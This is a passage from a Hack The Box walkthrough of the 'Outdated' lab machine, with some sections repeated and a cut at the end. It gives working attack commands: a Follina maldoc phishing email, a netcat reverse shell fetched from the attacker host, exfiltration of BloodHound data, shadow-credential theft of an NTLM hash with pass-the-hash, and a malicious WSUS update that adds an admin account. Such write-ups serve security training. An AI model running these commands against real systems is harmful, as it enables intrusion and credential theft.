OUTDATED\\DnsAdmins (4)\nS-1-5-21-4089647348-67660539-4016542185-1104 OUTDATED\\DnsUpdateProxy (2)\nS-1-5-21-4089647348-67660539-4016542185-1105 OUTDATED\\CLIENT$ (1)\nS-1-5-21-4089647348-67660539-4016542185-1106 OUTDATED\\btables (1)\nS-1-5-21-4089647348-67660539-4016542185-1107 OUTDATED\\ITStaff (2)\nS-1-5-21-4089647348-67660539-4016542185-1108 OUTDATED\\sflowers (1)\nS-1-5-21-4089647348-67660539-4016542185-1109 *unknown*\\*unknown* (8)\nWe find two users - btables & sflowers\nAsreproast fails:\n➜  outdated impacket-GetNPUsers outdated.htb/ -usersfile /htb/outdated/users.txt -format hashcat -dc-ip 10.10.11.175\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User btables doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User sflowers doesn't have UF_DONT_REQUIRE_PREAUTH set\n\n\n\nThe initial vectors on this machine are slim and I can’t see any other way in then utilizing SMTP, especially since CVE-2022-30190 (Follina) is listed in the PDF, so I decide to reboot the box - but to no avail. At this point I needed a sanity check so I went to the HackTheBox discord to confirm my suspicions, and sure enough SMTP is the vector for foothold.\nI waited for a day before continuing, and heard that the box should be fixed and more stable.\nInstead of logging in to the remote SMTP server over telnet, or using my own local SMTP server, we can try a third option - swaks.\n➜  outdated swaks --to itsupport@outdated.htb --from 0xpthree@exploit.se --server mail.outdated.htb --body \"http://10.10.14.6/pwn.html\"\n=== Trying mail.outdated.htb:25...\n=== Connected to mail.outdated.htb.\n&lt;-  220 mail.outdated.htb ESMTP\n -&gt; EHLO void\n&lt;-  250-mail.outdated.htb\n&lt;-  250-SIZE 20480000\n&lt;-  250-AUTH LOGIN\n&lt;-  250 HELP\n -&gt; MAIL FROM:&lt;0xpthree@exploit.se&gt;\n&lt;-  250 OK\n -&gt; RCPT TO:&lt;itsupport@outdated.htb&gt;\n&lt;-  250 OK\n -&gt; DATA\n&lt;-  354 OK, send.\n -&gt; Date: Mon, 15 Aug 2022 15:14:51 +0200\n -&gt; To: itsupport@outdated.htb\n -&gt; From: 0xpthree@exploit.se\n -&gt; Subject: test Mon, 15 Aug 2022 15:14:51 +0200\n -&gt; Message-Id: &lt;20220815151451.031141@void&gt;\n -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/\n -&gt; \n -&gt; http://10.10.14.6/pwn.html\n -&gt; \n -&gt; \n -&gt; .\n&lt;-  250 Queued (10.406 seconds)\n -&gt; QUIT\n&lt;-  221 goodbye\n➜  outdated python3 -m http.server 80                                                                                                         \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.175 - - [16/Aug/2022 09:05:43] code 404, message File not found\n10.10.11.175 - - [16/Aug/2022 09:05:43] \"GET /pwn HTTP/1.1\" 404 -\nThe machine is indeed fixed and now we get callbacks! However I had huge problems to get this next part to fly.\nWe want to utilize the CVE-2022-30190 (MSDT Follina) to download malicious scripts via en embeded link. To do this we use John Hammonds script which will create a malicious .doc file, host a webserver with needed html payload, and will start a netcat listener for you.\nThe payload will try to download nc64.exe and upload it to the victim, which will then be used to create a reverse shell. The code for this points towards John Hammonds Github, so since this is HackTheBox we need to change that to point to our local attacking machine.\nThis is row 111 in follina.py after editing:\ncommand = f\"\"\"Invoke-WebRequest http://10.10.14.2:8888/nc64.exe -OutFile C:\\\\Windows\\\\Tasks\\\\nc.exe; C:\\\\Windows\\\\Tasks\\\\nc.exe -e cmd.exe {serve_host} {args.reverse}\"\"\"\nWe can now execute follina.py and on the first row we’ll find the staging directory - it looks something like this [+] copied staging doc /tmp/67gup9zc.\nCopy nc64.exe to /tmp/67gup9zc/www and now you’re ready to send your email.\n➜  msdt-follina ls -al /tmp/67gup9zc/www\ntotal 64\ndrwxr-xr-x 2 void void  4096 Aug 19 13:04 .\ndrwxr-xr-x 4 void void  4096 Aug 19 12:54 ..\n-rw-r--r-- 1 void void  4689 Aug 19 12:54 index.html\n-rwxr-xr-x 1 void void 45272 Aug 19 13:04 nc64.exe\n\n➜  msdt-follina sendEmail -t itsupport@outdated.htb -f 0xpthree@exploit.se -s mail.outdated.htb -u PleaseWork -m 'http://10.10.14.2/'\nAug 19 12:54:31 void sendEmail[17349]: Email was sent successfully!\n\n➜  msdt-follina python3 follina.py -i tun0 -p 80 -r 4444     \n[+] copied staging doc /tmp/67gup9zc\n[+] created maldoc ./follina.doc\n[+] serving html payload on :80\n[+] starting 'nc -lvnp 4444' \nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.175] 49822\nMicrosoft Windows [Version 10.0.19043.928]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Users\\btables\\AppData\\Local\\Temp\\SDIAG_9fb3a047-99c4-4779-8d48-a154f6f5936e&gt;whoami\noutdated\\btables\nNOTE: For me to figure this out I downloaded and setup a python3 http redirect to log and see what happened behind the scenes, this could also have been done using Wireshark or anything similar.\n➜  msdt-follina python3 redirect.py 80 http://10.10.14.2:8888\n10.10.11.175 - - [19/Aug/2022 12:18:18] \"GET / HTTP/1.1\" 301 -\n10.10.11.175 - - [19/Aug/2022 12:18:20] \"GET /nc64.exe HTTP/1.1\" 301 -\nWith this information we can see that the script worked, but the payload delivery (of nc64.exe) didn’t.\n\n\n\nQuickly look through the box as user btables and we see that user.txt is not here, maybe we need to move laterally to sflowers that we found earlier.\nUpload SharpHound.exe to the target and start enumerating with BloodHound.\nC:\\Windows\\Tasks&gt;curl http://10.10.14.2:8888/SharpHound.exe -o C:\\Windows\\Tasks\\SharpHound.exe\nC:\\Windows\\Tasks&gt;dir\n08/19/2022  11:17 AM    &lt;DIR&gt;          .\n08/19/2022  11:17 AM    &lt;DIR&gt;          ..\n08/19/2022  11:17 AM           908,288 SharpHound.exe\n\n## Start listener to receive\n➜  outdated nc -lp 1234 &gt; SharpOut.zip\n\n## Send data\nC:\\Windows\\Tasks&gt;nc.exe -w3 10.10.14.2 1234 &lt; 20220819112306_SharpOut.zip\nIn BloodHound, mark user btables as Owned and search for Administrator. Press Shortest Path to Here from Owned and we see a nice path:\n\nSearching for AddKeyCredentialLink, we find Shadow Credentials and the tool Whisker.exe for exploitation. This technique allows an attacker to take over an AD user or computer account if the attacker can modify the target object’s (user or computer account) attribute msDS-KeyCredentialLink and append it with alternate credentials in the form of certificates.\nAdd the shadow credentials (modify the msDS-KeyCredentialLink attribute) to the vulnerable AD user sflowers using Whisker.exe.\nC:\\Windows\\Tasks&gt;curl http://10.10.14.2:8888/Whisker.exe -o C:\\Windows\\Tasks\\Whisker.exe\nc:\\Windows\\Tasks&gt;Whisker.exe add /target:sflowers\n[*] No path was provided. The certificate will be printed as a Base64 blob\n[*] No pass was provided. The certificate will be stored with the password qUOOiC6IHD1YbErH\n[*] Searching for the target account\n[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb\n[*] Generating certificate\n[*] Certificate generaged\n[*] Generating KeyCredential\n[*] KeyCredential generated with DeviceID 1b1d7ce3-46ae-4631-9ace-8e962ccdc9ba\n[*] Updating the msDS-KeyCredentialLink attribute of the target object\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] You can now run Rubeus with the following syntax:\n\nRubeus.exe asktgt /user:sflowers /certificate:MIIJsA...qoCAgfQ /password:\"qUOOiC6IHD1YbErH\" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show\nThe shadow credential has been added to the account and we are returned a long Rubeus.exe string, so lets upload Rubeus.exe and execute the command:\nC:\\Windows\\Tasks&gt;curl http://10.10.14.2:8888/Rubeus.exe -o C:\\Windows\\Tasks\\Rubeus.exe\nC:\\Windows\\Tasks&gt; Rubeus.exe asktgt /user:sflowers /certificate:MIIJsA...qoCAgfQ /password:\"qUOOiC6IHD1YbErH\" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers \n[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\\sflowers'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      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\n\n  ServiceName              :  krbtgt/outdated.htb\n  ServiceRealm             :  OUTDATED.HTB\n  UserName                 :  sflowers\n  UserRealm                :  OUTDATED.HTB\n  StartTime                :  8/19/2022 12:32:27 PM\n  EndTime                  :  8/19/2022 10:32:27 PM\n  RenewTill                :  8/26/2022 12:32:27 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  :  rc4_hmac\n  Base64(key)              :  6eMJxFK5gBo2hl7+F6oiWQ==\n  ASREP (key)              :  C930BD99144FF387606300042A2D9F52\n\n[*] Getting credentials using U2U\n\n  CredentialInfo         :\n    Version              : 0\n    EncryptionType       : rc4_hmac\n    CredentialData       :\n      CredentialCount    : 1\n       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5\nWe get a TGT and at the bottom we find the NTLM hash for sflowers, use evil-winrm and pass-the-hash:\n➜  outdated evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5\n*Evil-WinRM* PS C:\\Users\\sflowers\\Desktop&gt; type user.txt\n0190f8bd21ac78cd004055a7eb6bafb8\n\n\n\n\n\n\n# Root ### Step 1 Lets start by doing some quick manual enumeration.\n\n\n```powershell Evil-WinRM PS C:&gt; whoami /all\n\n\nUSER INFORMATION\n\n\n\nUser Name SID ================= ============================================ outdatedS-1-5-21-4089647348-67660539-4016542185-1108\n\n\n\nGroup Name Type SID Attributes =========================================== ================ ============================================ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTINManagement Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTINAlias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTINService DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITYWell-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITYUsers Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITYOrganization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group OUTDATEDAdministrators Alias S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITYAuthentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory LabelPlus Mandatory Level Label S-1-16-8448\n\n\n\nPrivilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\nWe're part of the group `WSUS Administrators` which is interestings, if WSUS is the privesc vector it would surely match the box name Outdated, lets dig deeper here.\n\nReading about compromising WSUS I find:\n&gt;_\"You can compromise the system if the updates are not requested using http**S** but http . And if `HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer` is equals to `1`, the it is exploitable.\"_\n\n```powershell\n*Evil-WinRM* PS C:\\WSUS\\WsusContent&gt; reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\n    WUServer    REG_SZ    http://wsus.outdated.htb:8530\n\n*Evil-WinRM* PS C:\\WSUS\\WsusContent&gt; reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\n    UseWUServer    REG_DWORD    0x1\nBoth requirements are met! To exploit we can use tools such as WSuspicious, Wsuxploit or pyWSUS, which are MiTM exploit scripts to inject fake updates into non-SSL WSUS traffic.\nTrying to compile WSuspicious I’m missing the packages ILMerge and Titanium.Web.Proxy, add nuget package source and update to match all requirements.\nNOTE: This tool will lead to a dead-end and later (Step 3) I will find another tool that works\n\nCompile the project and transfer the binary to Kali attacking machine.\n\n\nUpload the binaries needed for the attack:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; curl http://10.10.14.4/nc64.exe -o C:\\Windows\\Tasks\\nc64.exe\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; curl http://10.10.14.4/WSuspicious.exe -o C:\\Windows\\Tasks\\WSuspicious.exe\nRunning WSuspicious we get the and error that PsExec64.exe is not found:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; .\\ws.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\nDetected WSUS Server - wsus.outdated.htb\nws.exe : \n    + CategoryInfo          : NotSpecified: (:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\nUnhandled Exception: System.IO.FileNotFoundException: Could not find file 'C:\\Windows\\Tasks\\PsExec64.exe'.\nUploading the needed binary and try again:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; .\\WSuspicious.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\nDetected WSUS Server - wsus.outdated.htb\nListening on 'ExplicitProxyEndPoint' endpoint at Ip 127.0.0.1 and port: 13337\nHit any key to exit..\n\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; ls\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        8/22/2022   7:55 AM          45272 nc64.exe\n-a----         8/3/2022   4:19 PM         514472 PsExec64.exe\n-a----        8/22/2022  11:12 AM           2666 rootCert.pfx\n-a----        8/22/2022  11:11 AM        4548096 WSuspicious.exe\nThe server dies immediately and the test-file is not present, something is weird. Testing around I managed to get the server working propperly by setting up a new reverse connection:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; ./nc64.exe 10.10.14.4 4488 -e powershell\n➜  outdated nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.11.175] 49257\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\Tasks&gt; .\\WSuspicious.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\n.\\WSuspicious.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\nDetected WSUS Server - wsus.outdated.htb\nListening on 'ExplicitProxyEndPoint' endpoint at Ip 127.0.0.1 and port: 13337 \nHit any key to exit..\nWaiting for a few minutes and still nothing happens.. there seems to be something wrong on our end as when reading about WSuspicious it should also force look for updates:\n\n“WSuspicious is a C# program that takes the place of the user local proxy and forces the computer to look for updates while intercepting the WSUS traffic to inject a malicious payload.”\n\n\n\n\nLooking on other tools we find SharpWSUS. Compile it, upload to target and exploit the target to create a new administrator user.\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; curl http://10.10.14.4/SharpWSUS.exe -o C:\\Windows\\Tasks\\SharpWSUS.exe\n\n\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; .\\SharpWSUS.exe create /payload:'C:\\Windows\\Tasks\\PsExec64.exe' /args:'-accepteula -s -d cmd.exe /c \\\"net user 0xpthree Password123! /add && net localgroup Administrators 0xpthree /add && net localgroup Remote Management Users 0xpthree /add\"'\n\n[*] Action: Create Update\n[*] Creating patch to use the following:\n[*] Payload: PsExec64.exe\n[*] Payload Path: C:\\Windows\\Tasks\\PsExec64.exe\n[*] Arguments: -accepteula -s -d cmd.exe /c \"net user 0xpthree Password123! /add && net localgroup Administrators 0xpthree /add && net localgroup Remote Management Users 0xpthree /add\"\n[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;quot;net user 0xpthree Password123! /add &amp;amp;&amp;amp; net localgroup Administrators 0xpthree /add &amp;amp;&amp;amp; net localgroup Remote Management Users 0xpthree /add&amp;quot;\n\n################# WSUS Server Enumeration via SQL ##################\nServerName, WSUSPortNumber, WSUSContentLocation\n-----------------------------------------------\nDC, 8530, c:\\WSUS\\WsusContent\n\nImportUpdate\nUpdate Revision ID: 54\nPrepareXMLtoClient\nInjectURL2Download\nDeploymentRevision\nPrepareBundle\nPrepareBundle Revision ID: 55\nPrepareXMLBundletoClient\nDeploymentRevision\n\n[*] Update created - When ready to deploy use the following command:\n[*] SharpWSUS.exe approve /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:Target.FQDN /groupname:\"Group Name\"\n\n[*] To check on the update status use the following command:\n[*] SharpWSUS.exe check /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:Target.FQDN\n\n[*] To delete the update use the following command:\n[*] SharpWSUS.exe delete /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:Target.FQDN /groupname:\"Group Name\"\n\n[*] Create complete\n\n\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; ./SharpWSUS.exe approve /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:dc.outdated.htb /groupname:\"Administrators\"\n\n[*] Action: Approve Update\n\nTargeting dc.outdated.htb\nTargetComputer, ComputerID, TargetID\n------------------------------------\ndc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1\nGroup Exists = False\nGroup Created: Administrators\nAdded Computer To Group\nApproved Update\n\n[*] Approve complete\n\n\n➜  outdated evil-winrm -i outdated.htb -u 0xpthree -p Password123!\n*Evil-WinRM* PS C:\\Users\\0xpthree\\Documents&gt; whoami\noutdated\\0xpthree\n\n*Evil-WinRM* PS C:\\Users\\0xpthree\\Documents&gt; whoami /groups\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ===============================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt\na6c2f6e1b2d05b537f337ba2f8209413\n\n\n\n\n\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials\nhttps://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/\nhttps://labs.nettitude.com/blog/introducing-sharpwsus/\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment"
  },
  {
    "objectID": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html#group-information",
    "href": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html#group-information",
    "title": "Outdated - Hack The Box",
    "section": "",
    "text": "Group Name Type SID Attributes =========================================== ================ ============================================ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTINManagement Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTINAlias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTINService DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITYWell-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITYUsers Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITYOrganization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group OUTDATEDAdministrators Alias S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITYAuthentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory LabelPlus Mandatory Level Label S-1-16-8448"
  },
  {
    "objectID": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html#privileges-information",
    "href": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html#privileges-information",
    "title": "Outdated - Hack The Box",
    "section": "",
    "text": "Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\nWe're part of the group `WSUS Administrators` which is interestings, if WSUS is the privesc vector it would surely match the box name Outdated, lets dig deeper here.\n\nReading about compromising WSUS I find:\n&gt;_\"You can compromise the system if the updates are not requested using http**S** but http . And if `HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer` is equals to `1`, the it is exploitable.\"_\n\n```powershell\n*Evil-WinRM* PS C:\\WSUS\\WsusContent&gt; reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\n    WUServer    REG_SZ    http://wsus.outdated.htb:8530\n\n*Evil-WinRM* PS C:\\WSUS\\WsusContent&gt; reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\n    UseWUServer    REG_DWORD    0x1\nBoth requirements are met! To exploit we can use tools such as WSuspicious, Wsuxploit or pyWSUS, which are MiTM exploit scripts to inject fake updates into non-SSL WSUS traffic.\nTrying to compile WSuspicious I’m missing the packages ILMerge and Titanium.Web.Proxy, add nuget package source and update to match all requirements.\nNOTE: This tool will lead to a dead-end and later (Step 3) I will find another tool that works\n\nCompile the project and transfer the binary to Kali attacking machine.\n\n\nUpload the binaries needed for the attack:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; curl http://10.10.14.4/nc64.exe -o C:\\Windows\\Tasks\\nc64.exe\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; curl http://10.10.14.4/WSuspicious.exe -o C:\\Windows\\Tasks\\WSuspicious.exe\nRunning WSuspicious we get the and error that PsExec64.exe is not found:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; .\\ws.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\nDetected WSUS Server - wsus.outdated.htb\nws.exe : \n    + CategoryInfo          : NotSpecified: (:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\nUnhandled Exception: System.IO.FileNotFoundException: Could not find file 'C:\\Windows\\Tasks\\PsExec64.exe'.\nUploading the needed binary and try again:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; .\\WSuspicious.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\nDetected WSUS Server - wsus.outdated.htb\nListening on 'ExplicitProxyEndPoint' endpoint at Ip 127.0.0.1 and port: 13337\nHit any key to exit..\n\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; ls\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        8/22/2022   7:55 AM          45272 nc64.exe\n-a----         8/3/2022   4:19 PM         514472 PsExec64.exe\n-a----        8/22/2022  11:12 AM           2666 rootCert.pfx\n-a----        8/22/2022  11:11 AM        4548096 WSuspicious.exe\nThe server dies immediately and the test-file is not present, something is weird. Testing around I managed to get the server working propperly by setting up a new reverse connection:\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; ./nc64.exe 10.10.14.4 4488 -e powershell\n➜  outdated nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.11.175] 49257\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\Tasks&gt; .\\WSuspicious.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\n.\\WSuspicious.exe /command:\" - accepteula - s - d cmd / c 'echo test &gt; C:\\Windows\\Tasks\\wsuspicious.txt'\" /autoinstall\nDetected WSUS Server - wsus.outdated.htb\nListening on 'ExplicitProxyEndPoint' endpoint at Ip 127.0.0.1 and port: 13337 \nHit any key to exit..\nWaiting for a few minutes and still nothing happens.. there seems to be something wrong on our end as when reading about WSuspicious it should also force look for updates:\n\n“WSuspicious is a C# program that takes the place of the user local proxy and forces the computer to look for updates while intercepting the WSUS traffic to inject a malicious payload.”\n\n\n\n\nLooking on other tools we find SharpWSUS. Compile it, upload to target and exploit the target to create a new administrator user.\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; curl http://10.10.14.4/SharpWSUS.exe -o C:\\Windows\\Tasks\\SharpWSUS.exe\n\n\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; .\\SharpWSUS.exe create 